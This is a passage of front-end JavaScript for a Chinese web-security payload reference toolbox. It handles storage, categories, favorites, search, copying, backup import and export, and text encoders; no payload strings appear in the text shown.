      var cat = typeof item.cat === "string" ? item.cat.trim() : "";
      if (!cat || cat === FAV_CAT || cat === NEW_CAT_VALUE) cat = UNCATEGORIZED;
      if (!isBuiltinCategory(cat) && out.customCategories.indexOf(cat) === -1) {
        out.customCategories.push(cat);
      }
      var id = typeof item.id === "string" && item.id && !usedIds[item.id] ? item.id : makeId();
      usedIds[id] = true;
      out.customPayloads.push({
        id: id,
        cat: cat,
        sub: typeof item.sub === "string" && item.sub ? item.sub : "自定义",
        desc: desc || "自定义Payload",
        payload: payload,
        builtin: false,
        fav: false,
        createdAt: typeof item.createdAt === "number" && isFinite(item.createdAt) ? item.createdAt : Date.now()
      });
    });

    var favs = Array.isArray(raw.favorites) ? raw.favorites : [];
    favs.forEach(function (id) {
      if (typeof id === "string" && out.favorites.indexOf(id) === -1) out.favorites.push(id);
    });

    return out;
  }

  function loadData() {
    try {
      var raw = localStorage.getItem(STORAGE_KEY);
      if (!raw) return defaultData();
      return sanitizeStoredData(JSON.parse(raw));
    } catch (err) {
      console.warn("读取本地数据失败，已使用空数据：", err);
      return defaultData();
    }
  }

  function persist() {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(state.data));
    } catch (err) {
      toast("本地存储写入失败，可能空间不足", "error");
    }
  }

  /** 清理指向已删除Payload的收藏ID */
  function pruneFavorites() {
    var valid = {};
    BUILTIN_PAYLOADS.forEach(function (item) { valid[item.id] = true; });
    state.data.customPayloads.forEach(function (item) { valid[item.id] = true; });
    var seen = {};
    state.data.favorites = state.data.favorites.filter(function (id) {
      if (!valid[id] || seen[id]) return false;
      seen[id] = true;
      return true;
    });
  }

  function ensureCategory(name) {
    if (!name || name === FAV_CAT || name === NEW_CAT_VALUE || isBuiltinCategory(name)) return;
    if (state.data.customCategories.indexOf(name) === -1) state.data.customCategories.push(name);
  }

  /* ==================== 数据合并与查询 ==================== */
  /** 合并内置与自定义数据，并附加收藏状态 */
  function getAllPayloads() {
    var favs = {};
    state.data.favorites.forEach(function (id) { favs[id] = true; });
    var result = [];
    var customs = state.data.customPayloads.slice().sort(function (a, b) {
      return (b.createdAt || 0) - (a.createdAt || 0);
    });
    customs.forEach(function (item) {
      result.push({
        id: item.id,
        cat: item.cat,
        sub: item.sub || "自定义",
        desc: item.desc,
        payload: item.payload,
        builtin: false,
        fav: !!favs[item.id]
      });
    });
    BUILTIN_PAYLOADS.forEach(function (item) {
      result.push({
        id: item.id,
        cat: item.cat,
        sub: item.sub,
        desc: item.desc,
        payload: item.payload,
        builtin: true,
        fav: !!favs[item.id]
      });
    });
    return result;
  }

  function findPayloadById(id) {
    var all = getAllPayloads();
    for (var i = 0; i < all.length; i++) {
      if (all[i].id === id) return all[i];
    }
    return null;
  }

  function getVisibleList() {
    var all = getAllPayloads();
    if (state.search) {
      var term = state.search.toLowerCase();
      return all.filter(function (item) {
        var haystack = (item.desc + " " + item.payload + " " + item.sub + " " + item.cat).toLowerCase();
        return haystack.indexOf(term) !== -1;
      });
    }
    if (state.category === FAV_CAT) {
      return all.filter(function (item) { return item.fav; });
    }
    return all.filter(function (item) { return item.cat === state.category; });
  }

  function buildCategoryCounts() {
    var counts = {};
    getAllPayloads().forEach(function (item) {
      counts[item.cat] = (counts[item.cat] || 0) + 1;
    });
    counts[FAV_CAT] = state.data.favorites.length;
    return counts;
  }

  /* ==================== 渲染：左侧导航 ==================== */
  function ensureCurrentCategory() {
    if (state.category === FAV_CAT) return;
    if (!categoryExists(state.category)) state.category = BUILTIN_CATEGORIES[0];
  }

  function navRowHTML(cat, counts, custom) {
    var active = state.category === cat && !state.search;
    var html = '<div class="cat-row" data-cat="' + esc(cat) + '">';
    html += '<button type="button" class="cat-item' + (active ? " active" : "") + '" data-cat-action="select" title="' + esc(cat) + '">';
    html += '<span class="cat-name">' + esc(cat) + '</span>';
    html += '<span class="cat-count">' + (counts[cat] || 0) + '</span>';
    html += '</button>';
    if (custom) {
      html += '<div class="cat-actions">';
      html += '<button type="button" class="cat-tool" data-cat-action="rename" title="重命名分类">✎</button>';
      html += '<button type="button" class="cat-tool del" data-cat-action="delete" title="删除分类">×</button>';
      html += '</div>';
    }
    html += '</div>';
    return html;
  }

  function renderNav() {
    var counts = buildCategoryCounts();
    var html = '<div class="nav-group-label"><span>内置分类</span></div>';
    BUILTIN_CATEGORIES.forEach(function (cat) {
      html += navRowHTML(cat, counts, false);
    });
    html += navRowHTML(FAV_CAT, counts, false);
    html += '<div class="nav-group-label"><span>自定义分类</span><button type="button" class="nav-add" data-cat-action="new" title="新建自定义分类">+</button></div>';
    if (!state.data.customCategories.length) {
      html += '<div class="nav-empty">暂无自建分类</div>';
    } else {
      state.data.customCategories.forEach(function (cat) {
        html += navRowHTML(cat, counts, true);
      });
    }
    els.catNav.innerHTML = html;
  }

  /* ==================== 渲染：Payload卡片 ==================== */
  function cardHTML(item, term) {
    var custom = !item.builtin;
    var classes = "card" + (custom ? " custom" : "") + (state.selected[item.id] ? " selected" : "");
    var html = '<article class="' + classes + '" data-id="' + esc(item.id) + '">';
    html += '<div class="card-head">';
    if (state.selectMode && custom) {
      html += '<input type="checkbox" class="sel-check" data-role="select" ' + (state.selected[item.id] ? "checked" : "") + ' aria-label="选择此Payload">';
    }
    html += '<span class="tag ' + (custom ? "custom" : "builtin") + '">' + (custom ? "自定义" : "内置") + '</span>';
    html += '<span class="sub-tag" title="' + esc(item.sub) + '">' + esc(item.sub) + '</span>';
    html += '<button type="button" class="fav-btn' + (item.fav ? " on" : "") + '" data-action="fav" title="' + (item.fav ? "取消收藏" : "收藏") + '">' + (item.fav ? "★" : "☆") + '</button>';
    html += '</div>';
    html += '<div class="desc">' + highlight(item.desc, term) + '</div>';
    html += '<pre class="payload">' + highlight(item.payload, term) + '</pre>';
    html += '<div class="card-actions">';
    html += '<button type="button" class="act encode" data-action="encode" title="发送到编码工具">编码</button>';
    if (custom) {
      html += '<button type="button" class="act" data-action="edit">编辑</button>';
      html += '<button type="button" class="act danger" data-action="delete">删除</button>';
    }
    html += '<button type="button" class="act copy" data-action="copy">复制</button>';
    html += '</div></article>';
    return html;
  }

  function emptyStateHTML() {
    var icon = "∅";
    var title = "该分类暂无Payload";
    var text = "可以添加自定义Payload，或从备份文件导入。";
    var button = '<button type="button" class="btn btn-primary btn-xs" data-action="add-payload">+ 添加Payload</button>';

    if (state.search) {
      icon = "⌕";
      title = "未找到匹配的Payload";
      text = "没有与「" + esc(state.search) + "」相关的内容，试试更换关键词。";
      button = '<button type="button" class="btn btn-ghost btn-xs" data-action="clear-search">清空搜索</button>';
    } else if (state.category === FAV_CAT) {
      icon = "☆";
      title = "还没有收藏";
      text = "点击任意Payload卡片右上角的星标，即可收藏到这里。";
      button = '<button type="button" class="btn btn-ghost btn-xs" data-action="go-sql">去Payload库看看</button>';
    } else if (state.data.customCategories.indexOf(state.category) !== -1) {
      title = "该分类暂无Payload";
      text = "添加一条自定义Payload到这个分类吧。";
    }

    return '<div class="empty-state"><div class="empty-icon">' + icon + '</div><strong>' + title + '</strong><span>' + text + '</span>' + button + '</div>';
  }

  function updateSelectBar() {
    if (!state.selectMode) {
      els.selectBar.classList.add("hidden");
      return;
    }
    els.selectBar.classList.remove("hidden");
    var customs = getVisibleList().filter(function (item) { return !item.builtin; });
    var count = 0;
    customs.forEach(function (item) { if (state.selected[item.id]) count++; });
    els.selectedCount.textContent = "已选 " + count + " 条";
    els.deleteSelectedBtn.disabled = count === 0;
    els.deleteSelectedBtn.textContent = count ? "删除选中 (" + count + ")" : "删除选中";
    els.selectAllCheck.checked = customs.length > 0 && count === customs.length;
    els.selectAllCheck.disabled = customs.length === 0;
  }

  function renderContent() {
    var list = getVisibleList();
    var term = state.search;
    var isSearch = !!term;

    els.categoryTitle.textContent = isSearch ? "搜索结果" : state.category;
    els.categoryTitle.title = isSearch ? "全库搜索：" + term : state.category;
    els.categoryCount.textContent = list.length + " 条";

    var hasCustom = list.some(function (item) { return !item.builtin; });
    if (!hasCustom && state.selectMode) {
      state.selectMode = false;
      state.selected = {};
    }
    els.batchBtn.disabled = !hasCustom;
    els.copyAllBtn.disabled = list.length === 0;
    els.selectBar.classList.toggle("hidden", !state.selectMode);

    if (!list.length) {
      els.cardList.innerHTML = emptyStateHTML();
    } else {
      var html = "";
      list.forEach(function (item) { html += cardHTML(item, term); });
      els.cardList.innerHTML = html;
    }
    updateSelectBar();
  }

  function renderAll() {
    ensureCurrentCategory();
    renderNav();
    renderContent();
  }

  /* ==================== 复制功能（含降级） ==================== */
  function fallbackCopy(text) {
    var ta = document.createElement("textarea");
    ta.value = text;
    ta.setAttribute("readonly", "readonly");
    ta.style.position = "fixed";
    ta.style.left = "-9999px";
    ta.style.top = "0";
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, ta.value.length);
    var ok = false;
    try {
      ok = document.execCommand("copy");
    } catch (err) {
      ok = false;
    }
    document.body.removeChild(ta);
    return ok;
  }

  /** 优先异步剪贴板API，失败时降级为 execCommand */
  function copyText(text) {
    var clean = String(text == null ? "" : text).replace(/^\s+|\s+$/g, "");
    if (navigator.clipboard && typeof navigator.clipboard.writeText === "function") {
      return navigator.clipboard.writeText(clean).then(function () {
        return true;
      }).catch(function () {
        return fallbackCopy(clean);
      });
    }
    return Promise.resolve(fallbackCopy(clean));
  }

  function handleCopyButton(btn, text, normalLabel) {
    copyText(text).then(function (ok) {
      clearTimeout(btn.__copyTimer);
      if (!ok) {
        btn.classList.remove("copied");
        btn.classList.add("failed");
        btn.textContent = "复制失败";
        toast("复制失败，请手动选择文本复制", "error");
      } else {
        btn.classList.remove("failed");
        btn.classList.add("copied");
        btn.textContent = "已复制 ✓";
      }
      btn.__copyTimer = setTimeout(function () {
        btn.classList.remove("copied", "failed");
        btn.textContent = normalLabel;
      }, 1000);
    });
  }

  function copyAllCurrent() {
    var list = getVisibleList();
    if (!list.length) {
      toast("当前列表没有可复制的Payload", "error");
      return;
    }
    var text = list.map(function (item) { return item.payload.trim(); }).join("\n");
    handleCopyButton(els.copyAllBtn, text, "复制本类全部");
  }


  /* ==================== 弹窗通用控制 ==================== */
  function openModal(id) {
    MODAL_IDS.forEach(function (mid) {
      if (mid === id) return;
      els[mid].classList.add("hidden");
      els[mid].setAttribute("aria-hidden", "true");
    });
    els.overlay.classList.remove("hidden");
    els[id].classList.remove("hidden");
    els[id].setAttribute("aria-hidden", "false");
  }

  function closeModal(id) {
    var modal = els[id];
    if (!modal) return;
    modal.classList.add("hidden");
    modal.setAttribute("aria-hidden", "true");

    if (id === "payloadModal") state.editingId = null;
    if (id === "confirmModal" && state.confirmResolver) {
      var resolver = state.confirmResolver;
      state.confirmResolver = null;
      resolver(false);
    }

    var anyOpen = MODAL_IDS.some(function (mid) {
      return !els[mid].classList.contains("hidden");
    });
    if (!anyOpen) els.overlay.classList.add("hidden");
  }

  /** Promise 版确认框，checkLabel 为可选附加勾选项 */
  function showConfirm(options) {
    options = options || {};
    if (state.confirmResolver) {
      var previous = state.confirmResolver;
      state.confirmResolver = null;
      previous(false);
    }

    els.confirmTitle.textContent = options.title || "确认操作";
    els.confirmMessage.textContent = options.message || "";
    els.confirmOkBtn.textContent = options.okText || "确认";
    els.confirmOkBtn.disabled = false;
    els.confirmCheck.checked = !!options.checkDefault;

    if (options.checkLabel) {
      els.confirmCheckLine.classList.remove("hidden");
      els.confirmCheckLabel.textContent = options.checkLabel;
    } else {
      els.confirmCheckLine.classList.add("hidden");
    }

    openModal("confirmModal");
    return new Promise(function (resolve) {
      state.confirmResolver = resolve;
    });
  }

  function finishConfirm(ok) {
    var resolver = state.confirmResolver;
    state.confirmResolver = null;
    closeModal("confirmModal");
    if (resolver) resolver(ok);
  }

  /* ==================== 分类切换与搜索 ==================== */
  function selectCategory(cat) {
    if (!categoryExists(cat)) return;
    state.category = cat;
    state.search = "";
    els.searchInput.value = "";
    els.clearSearchBtn.classList.add("hidden");
    state.selectMode = false;
    state.selected = {};
    renderAll();
    els.cardList.scrollTop = 0;
  }

  function clearSearch() {
    state.search = "";
    els.searchInput.value = "";
    els.clearSearchBtn.classList.add("hidden");
    state.selectMode = false;
    state.selected = {};
    renderNav();
    renderContent();
    els.searchInput.focus();
  }

  function switchTab(tab) {
    var isPayload = tab === "payload";
    state.tab = isPayload ? "payload" : "encode";
    els.tabPayload.classList.toggle("active", isPayload);
    els.tabEncode.classList.toggle("active", !isPayload);
    els.tabPayload.setAttribute("aria-selected", isPayload ? "true" : "false");
    els.tabEncode.setAttribute("aria-selected", isPayload ? "false" : "true");
    els.viewPayload.classList.toggle("active", isPayload);
    els.viewEncode.classList.toggle("active", !isPayload);
  }

  /* ==================== 收藏与复制 ==================== */
  function toggleFavorite(id) {
    var item = findPayloadById(id);
    if (!item) return;
    var idx = state.data.favorites.indexOf(id);
    if (idx === -1) {
      state.data.favorites.push(id);
      toast("已加入收藏", "success");
    } else {
      state.data.favorites.splice(idx, 1);
      toast("已取消收藏", "success");
    }
    persist();
    renderNav();
    renderContent();
  }

  function sendToCodec(text) {
    switchTab("encode");
    els.encodeInput.value = text;
    els.encodeOutput.value = "";
    els.encodeInput.focus();
    els.encodeInput.setSelectionRange(text.length, text.length);
  }

  function setSelectMode(on) {
    if (on && !getVisibleList().some(function (item) { return !item.builtin; })) {
      toast("当前列表没有可批量操作的自定义Payload", "error");
      return;
    }
    state.selectMode = !!on;
    if (!on) state.selected = {};
    renderContent();
  }

  /* ==================== Payload 新增 / 编辑 ==================== */
  function populateCategorySelect(selected) {
    var html = "";
    BUILTIN_CATEGORIES.forEach(function (cat) {
      html += '<option value="' + esc(cat) + '">' + esc(cat) + "</option>";
    });
    if (state.data.customCategories.length) {
      html += '<optgroup label="自定义分类">';
      state.data.customCategories.forEach(function (cat) {
        html += '<option value="' + esc(cat) + '">' + esc(cat) + "</option>";
      });
      html += "</optgroup>";
    }
    html += '<option value="' + NEW_CAT_VALUE + '">+ 新建自定义分类…</option>';
    els.payloadCategory.innerHTML = html;

    var target = selected;
    if (!target || target === FAV_CAT || target === NEW_CAT_VALUE || !categoryExists(target)) {
      target = BUILTIN_CATEGORIES[0];
    }
    els.payloadCategory.value = target;
  }

  function clearPayloadError() {
    els.payloadError.textContent = "";
    els.payloadError.classList.add("hidden");
  }

  function showPayloadError(message) {
    els.payloadError.textContent = message;
    els.payloadError.classList.remove("hidden");
  }

  function openPayloadModal(mode, payloadId) {
    state.editingId = mode === "edit" ? payloadId : null;
    els.payloadModalTitle.textContent = mode === "edit" ? "编辑Payload" : "添加Payload";
    els.payloadForm.reset();
    clearPayloadError();
    els.newCatField.classList.add("hidden");
    els.newCategoryInput.value = "";

    var preset = state.category === FAV_CAT ? BUILTIN_CATEGORIES[0] : state.category;
    populateCategorySelect(preset);

    if (mode === "edit") {
      var item = findPayloadById(payloadId);
      if (!item || item.builtin) {
        toast("该Payload不可编辑", "error");
        return;
      }
      els.payloadCategory.value = item.cat;
      els.payloadDesc.value = item.desc;
      els.payloadContent.value = item.payload;
    }

    openModal("payloadModal");
    window.setTimeout(function () {
      (mode === "edit" ? els.payloadContent : els.payloadDesc).focus();
    }, 30);
  }

  function savePayload() {
    clearPayloadError();
    var cat = els.payloadCategory.value;
    var newCat = els.newCategoryInput.value.trim();
    var desc = els.payloadDesc.value.trim();
    var payload = els.payloadContent.value.replace(/^\s+|\s+$/g, "");

    if (cat === NEW_CAT_VALUE) {
      if (!newCat) return showPayloadError("请输入新分类名称");
      if (newCat === FAV_CAT) return showPayloadError("「我的收藏」是系统分类，不能作为自定义分类");
      if (newCat === UNCATEGORIZED) return showPayloadError("「未分类」为系统保留分类，请换一个名称");
      if (isBuiltinCategory(newCat)) return showPayloadError("不能与内置分类重名，请换一个名称");
      cat = newCat;
    }
    if (!cat) return showPayloadError("请选择归属分类");
    if (!desc) return showPayloadError("请填写场景说明，便于日后检索");
    if (desc.length > 120) return showPayloadError("场景说明不能超过120个字符");
    if (!payload) return showPayloadError("请填写Payload内容");
    if (payload.length > 8000) return showPayloadError("Payload内容不能超过8000个字符");

    if (!isBuiltinCategory(cat)) ensureCategory(cat);

    if (state.editingId) {
      var target = null;
      state.data.customPayloads.forEach(function (item) {
        if (item.id === state.editingId) target = item;
      });
      if (!target) return showPayloadError("目标Payload已不存在，可能已被删除");
      target.cat = cat;
      target.desc = desc;
      target.payload = payload;
      persist();
      closeModal("payloadModal");
      state.editingId = null;
      if (!state.search) state.category = cat;
      renderAll();
      toast("已保存修改", "success");
      return;
    }

    state.data.customPayloads.push({
      id: makeId(),
      cat: cat,
      sub: "自定义",
      desc: desc,
      payload: payload,
      builtin: false,
      fav: false,
      createdAt: Date.now()
    });
    persist();
    closeModal("payloadModal");
    if (!state.search) state.category = cat;
    renderAll();
    toast("已添加自定义Payload", "success");
  }

  function deletePayload(id) {
    delete state.selected[id];
    state.data.customPayloads = state.data.customPayloads.filter(function (item) {
      return item.id !== id;
    });
    state.data.favorites = state.data.favorites.filter(function (favId) {
      return favId !== id;
    });
    persist();
    renderAll();
    toast("Payload已删除", "success");
  }

  function askDeletePayload(item) {
    showConfirm({
      title: "删除Payload",
      message: "确定删除这条自定义Payload吗？删除后无法恢复。",
      okText: "删除"
    }).then(function (ok) {
      if (ok) deletePayload(item.id);
    });
  }

  function deleteSelected() {
    var ids = {};
    var count = 0;
    Object.keys(state.selected).forEach(function (id) {
      if (state.selected[id]) {
        ids[id] = true;
        count++;
      }
    });
    if (!count) return;

    showConfirm({
      title: "批量删除",
      message: "确定删除选中的 " + count + " 条自定义Payload吗？删除后无法恢复。",
      okText: "删除"
    }).then(function (ok) {
      if (!ok) return;
      state.data.customPayloads = state.data.customPayloads.filter(function (item) {
        return !ids[item.id];
      });
      state.data.favorites = state.data.favorites.filter(function (id) {
        return !ids[id];
      });
      state.selectMode = false;
      state.selected = {};
      persist();
      renderAll();
      toast("已删除 " + count + " 条Payload", "success");
    });
  }

  /* ==================== 自定义分类管理 ==================== */
  function openCategoryModal(mode, cat) {
    state.categoryMode = mode;
    state.renamingCategory = mode === "rename" ? cat : "";
    els.categoryModalTitle.textContent = mode === "rename" ? "重命名分类" : "新建分类";
    els.categoryForm.reset();
    els.categoryNameInput.value = mode === "rename" ? cat : "";
    els.categoryError.textContent = "";
    els.categoryError.classList.add("hidden");
    openModal("categoryModal");
    window.setTimeout(function () { els.categoryNameInput.focus(); }, 30);
  }

  function showCategoryError(message) {
    els.categoryError.textContent = message;
    els.categoryError.classList.remove("hidden");
  }

  function saveCategory() {
    var name = els.categoryNameInput.value.trim();
    els.categoryError.classList.add("hidden");

    if (!name) return showCategoryError("请输入分类名称");
    if (name.length > 20) return showCategoryError("分类名称不能超过20个字符");
    if (name === FAV_CAT) return showCategoryError("「我的收藏」是系统分类，不能使用");
    if (name === NEW_CAT_VALUE) return showCategoryError("该名称为系统保留值，请更换");
    if (isBuiltinCategory(name)) return showCategoryError("不能与内置分类重名，请更换名称");

    var oldName = state.renamingCategory;
    if (name === UNCATEGORIZED && oldName !== UNCATEGORIZED) {
      return showCategoryError("「未分类」为系统保留分类，请更换名称");
    }
    var exists = state.data.customCategories.indexOf(name) !== -1;
    if (exists && name !== oldName) return showCategoryError("已存在同名的自定义分类");

    if (state.categoryMode === "rename") {
      var idx = state.data.customCategories.indexOf(oldName);
      if (idx === -1) {
        closeModal("categoryModal");
        toast("原分类已不存在", "error");
        return;
      }
      state.data.customCategories[idx] = name;
      state.data.customPayloads.forEach(function (item) {
        if (item.cat === oldName) item.cat = name;
      });
      if (state.category === oldName) state.category = name;
      persist();
      closeModal("categoryModal");
      renderAll();
      toast("分类已重命名", "success");
      return;
    }

    if (!exists) state.data.customCategories.push(name);
    persist();
    closeModal("categoryModal");
    state.category = name;
    state.search = "";
    els.searchInput.value = "";
    els.clearSearchBtn.classList.add("hidden");
    renderAll();
    toast("分类已创建", "success");
  }

  function askDeleteCategory(cat) {
    if (cat === UNCATEGORIZED) {
      toast("「未分类」是系统保留分类，不能删除", "error");
      return;
    }
    var count = state.data.customPayloads.filter(function (item) {
      return item.cat === cat;
    }).length;
    var message = "确定删除自定义分类「" + cat + "」吗？";
    if (count) {
      message += "\n\n该分类下还有 " + count + " 条自定义Payload。勾选下方选项将一并删除，不勾选则移动到「未分类」。";
    }

    showConfirm({
      title: "删除分类",
      message: message,
      checkLabel: count ? "同时删除该分类下的 " + count + " 条自定义Payload" : "",
      checkDefault: false,
      okText: "删除"
    }).then(function (ok) {
      if (!ok) return;
      var deleteChildren = count > 0 && els.confirmCheck.checked;

      state.data.customCategories = state.data.customCategories.filter(function (name) {
        return name !== cat;
      });

      if (deleteChildren) {
        state.data.customPayloads = state.data.customPayloads.filter(function (item) {
          return item.cat !== cat;
        });
      } else if (count) {
        state.data.customPayloads.forEach(function (item) {
          if (item.cat === cat) item.cat = UNCATEGORIZED;
        });
        ensureCategory(UNCATEGORIZED);
      }

      if (state.category === cat) {
        state.category = count && !deleteChildren ? UNCATEGORIZED : BUILTIN_CATEGORIES[0];
      }
      state.selectMode = false;
      state.selected = {};
      pruneFavorites();
      persist();
      renderAll();
      toast(deleteChildren ? "分类及Payload已删除" : "分类已删除", "success");
    });
  }


  /* ==================== 数据导入 / 导出 ==================== */
  function updateDataStats() {
    els.dataStats.textContent = "当前数据：自定义Payload " + state.data.customPayloads.length +
      " 条 · 自建分类 " + state.data.customCategories.length +
      " 个 · 收藏 " + state.data.favorites.length + " 条";
  }

  function showDataError(message) {
    els.dataError.textContent = message;
    els.dataError.classList.remove("hidden");
  }

  function clearDataError() {
    els.dataError.textContent = "";
    els.dataError.classList.add("hidden");
  }

  function openDataModal() {
    clearDataError();
    updateDataStats();
    openModal("dataModal");
  }

  function pad2(value) {
    return value < 10 ? "0" + value : String(value);
  }

  function backupFileName() {
    var d = new Date();
    return "web-payload-backup-" + d.getFullYear() + pad2(d.getMonth() + 1) + pad2(d.getDate()) +
      "-" + pad2(d.getHours()) + pad2(d.getMinutes()) + ".json";
  }

  function fallbackDownload(url, filename) {
    var a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.rel = "noopener";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  function exportData() {
    var backup = {
      app: "Web安全Payload速查工具箱",
      version: 1,
      exportedAt: new Date().toISOString(),
      data: state.data
    };
    var json = JSON.stringify(backup, null, 2);
    var blob = new Blob([json], { type: "application/json;charset=utf-8" });
    var url = URL.createObjectURL(blob);
    var filename = backupFileName();

    function cleanup() {
      window.setTimeout(function () { URL.revokeObjectURL(url); }, 30000);
    }

    if (typeof chrome !== "undefined" && chrome.downloads && typeof chrome.downloads.download === "function") {
      chrome.downloads.download({ url: url, filename: filename, saveAs: true }, function (downloadId) {
        var failed = false;
        try {
          failed = !!chrome.runtime.lastError;
        } catch (err) {
          failed = true;
        }
        if (failed) {
          toast("导出已取消或失败", "error");
        } else if (!downloadId) {
          fallbackDownload(url, filename);
          toast("已通过浏览器下载备份文件", "success");
        } else {
          toast("已导出备份文件", "success");
        }
        cleanup();
      });
      return;
    }

    fallbackDownload(url, filename);
    cleanup();
    toast("已导出备份文件", "success");
  }

  /** 严格校验导入结构，任何异常都不修改现有数据 */
  function validateImportData(payload) {
    if (!payload || typeof payload !== "object" || Array.isArray(payload)) {
      throw new Error("备份文件的JSON根节点必须是对象");
    }
    var cats = payload.customCategories;
    var items = payload.customPayloads;
    var favs = payload.favorites;
    if (!Array.isArray(cats) || !Array.isArray(items) || !Array.isArray(favs)) {
      throw new Error("缺少 customCategories / customPayloads / favorites 字段");
    }
    if (items.length > 3000) throw new Error("单次导入的自定义Payload不能超过3000条");

    cats.forEach(function (name, i) {
      if (typeof name !== "string" || !name.trim()) {
        throw new Error("customCategories 第 " + (i + 1) + " 项不是有效字符串");
      }
    });
    items.forEach(function (item, i) {
      if (!item || typeof item !== "object" || Array.isArray(item)) {
        throw new Error("customPayloads 第 " + (i + 1) + " 项格式不正确");
      }
      if (typeof item.payload !== "string" || !item.payload.trim()) {
        throw new Error("customPayloads 第 " + (i + 1) + " 项缺少 payload 内容");
      }
      if (item.desc != null && typeof item.desc !== "string") {
        throw new Error("customPayloads 第 " + (i + 1) + " 项的 desc 字段格式不正确");
      }
      if (item.cat != null && typeof item.cat !== "string") {
        throw new Error("customPayloads 第 " + (i + 1) + " 项的 cat 字段格式不正确");
      }
      if (item.sub != null && typeof item.sub !== "string") {
        throw new Error("customPayloads 第 " + (i + 1) + " 项的 sub 字段格式不正确");
      }
    });
    favs.forEach(function (id, i) {
      if (typeof id !== "string" || !id) {
        throw new Error("favorites 第 " + (i + 1) + " 项不是有效ID");
      }
    });
  }

  function getImportMode() {
    var checked = document.querySelector('input[name="importMode"]:checked');
    return checked && checked.value === "replace" ? "replace" : "append";
  }

  function applyImport(incoming, mode) {
    if (mode === "replace") {
      state.data = incoming;
    } else {
      state.data = sanitizeStoredData({
        customCategories: state.data.customCategories.concat(incoming.customCategories),
        customPayloads: state.data.customPayloads.concat(incoming.customPayloads),
        favorites: state.data.favorites.concat(incoming.favorites)
      });
    }
    pruneFavorites();
    persist();
    state.selectMode = false;
    state.selected = {};
    clearDataError();
    renderAll();
    updateDataStats();
    openModal("dataModal");
    toast("数据导入成功", "success");
  }

  function handleImportFile(file) {
    if (!file) return;
    if (file.size > 4 * 1024 * 1024) {
      showDataError("文件超过4MB，无法导入");
      els.importFile.value = "";
      return;
    }

    var reader = new FileReader();
    reader.onload = function () {
      els.importFile.value = "";
      var root;
      try {
        root = JSON.parse(String(reader.result).replace(/^\uFEFF/, ""));
      } catch (err) {
        showDataError("JSON 解析失败：" + err.message);
        return;
      }

      var payload = root && typeof root === "object" && root.data && typeof root.data === "object" ? root.data : root;
      try {
        validateImportData(payload);
      } catch (err) {
        showDataError(err.message);
        return;
      }

      var incoming = sanitizeStoredData(payload);
      var mode = getImportMode();
      if (mode === "replace") {
        var message = "覆盖导入会先清空当前所有自定义Payload、自建分类与收藏记录，再写入备份数据。\n\n此操作无法撤销，是否继续？";
        showConfirm({ title: "覆盖导入", message: message, okText: "覆盖导入" }).then(function (ok) {
          if (!ok) {
            openModal("dataModal");
            return;
          }
          applyImport(incoming, "replace");
        });
      } else {
        applyImport(incoming, "append");
      }
    };
    reader.onerror = function () {
      els.importFile.value = "";
      showDataError("文件读取失败，请重试");
    };
    reader.readAsText(file, "utf-8");
  }

  /* ==================== 编码 / 解码工具 ==================== */
  function bytesToBinary(bytes) {
    var bin = "";
    var chunk = 0x8000;
    for (var i = 0; i < bytes.length; i += chunk) {
      bin += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
    }
    return bin;
  }

  function encodeBase64(text) {
    var bytes = new TextEncoder().encode(text);
    return btoa(bytesToBinary(bytes));
  }

  function decodeBase64(text) {
    var clean = String(text).replace(/\s+/g, "").replace(/-/g, "+").replace(/_/g, "/");
    while (clean.length % 4) clean += "=";
    var bin = atob(clean);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
  }

  function encodeHtml(text) {
    var map = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
    return String(text).replace(/[&<>"']/g, function (ch) { return map[ch]; });
  }

  function decodeHtml(text) {
    return String(text).replace(/&(?:#x([0-9a-fA-F]+)|#(\d+)|(amp|lt|gt|quot|apos|nbsp));/g, function (match, hex, dec, name) {
      if (hex) {
        var hexCode = parseInt(hex, 16);
        return hexCode <= 0x10FFFF ? String.fromCodePoint(hexCode) : match;
      }
      if (dec) {
        var decCode = parseInt(dec, 10);
        return decCode <= 0x10FFFF ? String.fromCodePoint(decCode) : match;
      }
      var table = { amp: "&", lt: "<", gt: ">", quot: '"', apos: "'", nbsp: "\u00a0" };
      return table[name] || match;
    });
  }

  function encodeUnicode(text) {
    return String(text).replace(/[\s\S]/g, function (ch) {
      return "\\u" + ch.charCodeAt(0).toString(16).padStart(4, "0");
    });
  }

  function decodeUnicode(text) {
    return String(text)
      .replace(/\\u\{([0-9a-fA-F]+)\}/g, function (match, hex) {
        var code = parseInt(hex, 16);
        return code <= 0x10FFFF ? String.fromCodePoint(code) : match;
      })
      .replace(/\\u([0-9a-fA-F]{4})/g, function (match, hex) {
        return String.fromCharCode(parseInt(hex, 16));
      })
      .replace(/%u([0-9a-fA-F]{4})/g, function (match, hex) {
        return String.fromCharCode(parseInt(hex, 16));
      });
  }

  function encodeHex(text) {
    var bytes = new TextEncoder().encode(text);
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
      out += bytes[i].toString(16).padStart(2, "0");
    }
    return out;
  }

  function decodeHex(text) {
    var clean = String(text).replace(/\\x/gi, "").replace(/0x/gi, "").replace(/[^0-9a-fA-F]/g, "");
    if (!clean) throw new Error("未找到有效的十六进制内容");
    if (clean.length % 2 !== 0) throw new Error("十六进制字符数量必须为偶数");
    var bytes = new Uint8Array(clean.length / 2);
    for (var i = 0; i < bytes.length; i++) {
      bytes[i] = parseInt(clean.substr(i * 2, 2), 16);
    }
    return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
  }

  var CODECS = {
    url: {
      hint: "按 UTF-8 进行 URL 组件编码；解码时 + 视作空格",
      encode: function (text) { return encodeURIComponent(text); },
      decode: function (text) { return decodeURIComponent(String(text).replace(/\+/g, " ")); }
    },
    html: {
      hint: "HTML 实体编码，处理 & < > \" ' 五个字符",
      encode: encodeHtml,
      decode: decodeHtml
    },
    base64: {
      hint: "Base64 编码，按 UTF-8 转换，支持中文与 Emoji",
      encode: encodeBase64,
      decode: decodeBase64
    },
    unicode: {
      hint: "转换为 \\uXXXX 形式，适用于 Java / JavaScript 字符串",
